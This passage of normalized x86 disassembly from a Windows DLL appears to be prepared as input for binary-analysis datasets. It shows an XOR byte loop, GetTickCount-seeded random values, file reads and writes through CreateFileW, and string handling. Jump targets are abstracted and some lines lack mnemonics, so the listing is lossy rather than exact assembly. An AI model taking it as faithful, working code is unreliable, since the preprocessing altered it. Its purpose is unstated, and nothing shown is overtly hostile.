and edx 0x800000ff
jns r-xdata
movzx ebx [ edx + esi ]
mov edx [ ebp + 0x8 ]
xor [ edi + edx ] bl
inc edi
cmp edi [ ebp + 0xc ]
jb r-xdata
dec edx
or edx 0xffffff00
inc edx
sub_100130b0
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] 0x0
call [ GetTickCount@IAT ]
mov esi eax
call sub_1001aec0
add esi eax
push esi
call sub_1001aeae
lea eax [ ebp - 0x4 ]
push eax
call sub_1001adbe
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
sub esi ecx
add esp 0x8
xor edx edx
div esi
pop esi
lea eax [ ecx + edx ]
mov esp ebp
pop ebp
retn 0x8
sub_10013100
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
movzx eax [ esi ]
lea edx [ esi + 0x4 ]
push edx
push eax
call sub_10012e70
cmp [ esi + 0x2 ] ax
pop esi
sete al
pop ebp
retn 0x8
sub_10013130
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
add edi 0x4
push 0x1
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebx ] edi
call sub_1001a8ef
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
push edi
push esi
call sub_1001a92f
add esp 0x10
mov [ ebp + 0xc ] 0x0
call [ GetTickCount@IAT ]
mov edi eax
call sub_1001aec0
add edi eax
push edi
call sub_1001aeae
lea edx [ ebp + 0xc ]
push edx
call sub_1001adbe
mov ecx [ ebp + 0xc ]
mov eax ecx
xor edx edx
or edi 0xffffffff
div edi
add esp 0x8
add eax ecx
mov ecx [ ebp - 0x8 ]
push eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
sub eax 0x4
push eax
push esi
call sub_10012fc0
cmp al 0x1
je r-xdata
mov edx [ ebx ]
push 0x4
lea ecx [ ebp - 0x4 ]
push ecx
lea eax [ edx + esi - 0x4 ]
push 0x4
push eax
call sub_1001a92f
add esp 0x10
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push esi
call sub_1001a3eb
add esp 0x4
sub_10013200
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
add esi 0xfffffffc
push 0x1
push esi
mov [ ebp - 0x4 ] ecx
mov [ eax ] esi
call sub_1001a8ef
mov edi eax
add esp 0x8
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ esi + eax ]
push esi
push eax
push esi
push edi
call sub_1001a92f
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
add esp 0x10
push ebx
push edx
push edi
call sub_10012fc0
pop ebx
cmp al 0x1
je r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push edi
call sub_1001a3eb
add esp 0x4
sub_10013270
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push edx
push eax
call sub_1001b111
add esp 0x14
pop ebp
retn
sub_100132b0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
pop esi
jmp edx
sub_100132f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d400
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_100030d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10013390
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100190f4
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
cmp ecx 0x8
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_100014e0
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea eax [ eax + edi * 2 ]
cmp eax edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
xor edx edx
mov [ eax ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
sar edx 0x1
push edx
push esi
mov ecx esi
call sub_10007570
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
pop ebx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea ecx [ ebx + ebx ]
push ecx
push edx
mov edx [ esi + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_100134b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d43b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] ecx
xor ebx ebx
push 0xffffffff
lea ecx [ esi + 0x8 ]
mov [ esi ] eax
push ebx
lea edx [ ebp + 0x10 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] bl
call sub_10007380
push 0xffffffff
lea ecx [ esi + 0x24 ]
push ebx
lea edx [ ebp + 0x2c ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x2
mov [ ecx ] ax
call sub_100019e0
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
cmp [ ebp + 0x40 ] 0x8
mov [ ebp + 0x24 ] 0xf
mov [ ebp + 0x20 ] ebx
mov [ ebp + 0x10 ] bl
jb r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_10019ce4
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x40
mov ecx [ ebp + 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
sub_10013580
push ebp
mov ebp esp
sub esp 0xc
cmp [ ecx + 0x34 ] 0x0
jne r-xdata
push esi
push edi
lea esi [ ecx + 0x24 ]
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_100018f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov edi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_10013600
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push eax
push ecx
lea edx [ ebp - 0x84 ]
push r--data
push edx
mov edx 0x40
mov [ ebp - 0x88 ] 0x0
call sub_10013270
add esp 0x10
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
lea eax [ ebp - 0x84 ]
lea edx [ eax + 0x2 ]
mov edi edi
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x84 ]
push ecx
mov ecx esi
call sub_100034e0
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_1001a809
mov esp ebp
pop ebp
retn
sub_10013690
push ebp
mov ebp esp
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
fld [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
sub esp 0x8
fstp [ esp ]
lea eax [ ebp - 0xdc ]
push r--data
push eax
mov edx 0x6c
mov [ ebp - 0xe0 ] 0x0
call sub_10013270
add esp 0x10
xor ecx ecx
lea eax [ ebp - 0xdc ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
lea edx [ eax + 0x2 ]
nop
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0xdc ]
push edx
mov ecx esi
call sub_100034e0
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_1001a809
mov esp ebp
pop ebp
retn
sub_10013720
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d46b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
xor ebx ebx
xor eax eax
mov [ edi + 0x1c ] 0x7
mov [ edi + 0x18 ] ebx
mov [ edi + 0x8 ] ax
lea esi [ edi + 0x24 ]
push 0x8
mov [ ebp - 0x4 ] ebx
mov [ esi ] ebx
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10019ba5
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_1001a898
int3
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ edi + 0x4 ] edx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100137e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d4ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x24 ]
mov edi ecx
mov [ ebp - 0x30 ] eax
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
jae r-xdata
push 0x0
push 0x2
push 0x4
push 0x0
push 0x2
push 0x23
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp + 0x8 ]
mov edx [ ebp + 0x28 ]
mov eax [ ebp - 0x30 ]
push 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push edx
push eax
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
mov al 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_10019ce4
add esp 0x4
xor al al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10019ce4
add esp 0x4
xor al al
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10012790
push 0x68
push rw-data
mov ecx esi
call sub_10012770
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call sub_10012c50
push 0xffffffff
push 0x0
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call sub_10007570
mov edi 0x8
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x24
cmp [ ebp + 0x1c ] edi
jb r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
sub_10013960
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d4f9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] ebx
mov edi [ ebp + 0x1c ]
lea edi [ edi + edi + 0x2 ]
push 0x1
push edi
mov [ ebp - 0x4 ] 0x1
call sub_1001a8ef
add esp 0x8
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
call sub_100132f0
cmp [ ebp + 0x20 ] 0x8
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
jae r-xdata
mov ecx [ ebp + 0x1c ]
push ebx
push ebx
push edi
mov edi [ ebp - 0x14 ]
push edi
lea edx [ ecx + ecx ]
push edx
push eax
push ebx
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov eax edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
lea ecx [ eax + 0x1 ]
lea eax [ ebp + 0xc ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax ecx
push eax
push edi
mov ecx esi
call sub_10007470
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x18 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp edi ebx
je r-xdata
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp + 0xc ]
push eax
call sub_10019ce4
add esp 0x4
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
sub_10013a70
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x10 ]
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ eax + 0x14 ]
push esi
mov esi [ ecx + 0x10 ]
sub ebx edx
mov [ ebp - 0x4 ] 0x0
cmp esi ebx
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_10007570
mov esi [ ebp + 0x8 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] dx
call sub_10003860
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ecx + 0x14 ]
sub ebx esi
cmp ebx edx
jb r-xdata
push 0xffffffff
push 0x0
push eax
push 0x0
call sub_100071a0
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10003860
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10013b00
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
mov eax edx
push esi
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0xc ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_10013390
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10003860
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10013b60
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d55b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x70 ] ecx
push 0x1
xor eax eax
mov edi 0x7
xor ebx ebx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
call sub_100034e0
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10007d90
lea ecx [ ebp + 0x24 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x3
call sub_10007de0
add esp 0x18
mov esi 0x8
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x34 ] edi
mov edi [ CreateFileW@IAT ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
lea ebx [ ebx ]
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
push ebx
push 0x80
push 0x3
push ebx
push 0x3
push 0x80000000
push eax
call edi
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x2c ]
push ebx
push esi
call [ GetFileSize@IAT ]
mov edi eax
mov eax [ ebp - 0x70 ]
cmp edi [ eax + 0x4 ]
jbe r-xdata
call [ GetLastError@IAT ]
cmp eax 0x20
jne r-xdata
push edi
call sub_1001aa2a
add esp 0x4
push ebx
lea ecx [ ebp - 0x78 ]
push ecx
push edi
push eax
push esi
mov [ ebp - 0x74 ] eax
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov esi 0x8
jmp r-xdata
push 0x40
call sub_1001a818
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
xor edx edx
mov edi 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov edi 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
xor eax eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x7c ] esp
push 0xffffffff
push ebx
lea eax [ ebp + 0x24 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_100019e0
sub esp 0x1c
mov eax esp
mov [ ebp - 0x6c ] esp
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
xor edx edx
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
push ebx
lea edx [ ebp + 0x24 ]
push edx
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x6c ] eax
call sub_100019e0
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0x70 ]
push eax
call sub_10013960
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x68 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x7
call sub_100134b0
xor ebx ebx
jmp r-xdata
xor eax eax
mov edi 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] cx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] cx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
mov edi 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
mov ecx [ ebp - 0x70 ]
add ecx 0x24
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x68 ] eax
call sub_1000f6e0
push esi
call [ CloseHandle@IAT ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
xor edx edx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp + 0x24 ]
push edx
call sub_10019ce4
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp + 0x24 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp + 0x24 ]
push eax
call sub_10019ce4
add esp 0x4
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x38
xor eax eax
mov eax [ ebp + 0x24 ]
push eax
call sub_10019ce4
add esp 0x4
sub_10013ef0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
lea esi [ ecx + 0x8 ]
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push esi
mov ecx edi
mov [ ebp - 0x4 ] 0x0
mov [ edi ] ax
call sub_100019e0
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] 0x0
jb r-xdata
xor ecx ecx
mov eax edi
pop edi
mov [ esi ] cx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov esi [ esi ]
sub_10013f40
push ebp
mov ebp esp
push 0xffffffff
push sub_1002da18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x698 ] ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi 0x7
xor eax eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
push 0x18
mov [ ebp - 0x4 ] 0x2
call sub_1001a818
add esp 0x4
mov [ ebp - 0x6a8 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
xor edi edi
mov ecx eax
call sub_10012700
mov edi eax
jmp r-xdata
xor ecx ecx
push 0x1
mov [ ebp - 0x3c8 ] cx
push r--data
lea ecx [ ebp - 0x3c8 ]
mov [ ebp - 0x3b4 ] esi
mov [ ebp - 0x3b8 ] ebx
call sub_100034e0
lea edx [ ebp - 0x3c8 ]
push edx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x42c ]
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_10007d90
lea edx [ ebp + 0x24 ]
push edx
push eax
lea eax [ ebp - 0x144 ]
push eax
mov edi 0x8
mov [ ebp - 0x4 ] 0x8
call sub_10007de0
add esp 0x18
cmp [ ebp - 0x418 ] edi
jb r-xdata
mov ecx edi
call sub_10012740
push edi
call sub_10019ce4
add esp 0x4
push 0xc
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_10012790
push 0x12
push rw-data
mov ecx edi
call sub_10012770
lea ecx [ ebp - 0x2e8 ]
push ecx
mov ecx edi
call sub_10012c50
push 0x14
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x4
call sub_10012770
lea edx [ ebp - 0x160 ]
push edx
mov ecx edi
call sub_10012c50
push 0x16
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x5
call sub_10012770
lea eax [ ebp - 0x1ec ]
push eax
mov ecx edi
call sub_10012c50
mov [ ebp - 0x4 ] 0x6
cmp edi ebx
je r-xdata
xor edx edx
mov [ ebp - 0x418 ] esi
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x42c ] dx
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x3b4 ] edi
jb r-xdata
mov ecx [ ebp - 0x42c ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x144 ]
xor ecx ecx
mov [ ebp - 0x3b4 ] esi
mov [ ebp - 0x3b8 ] ebx
mov [ ebp - 0x3c8 ] cx
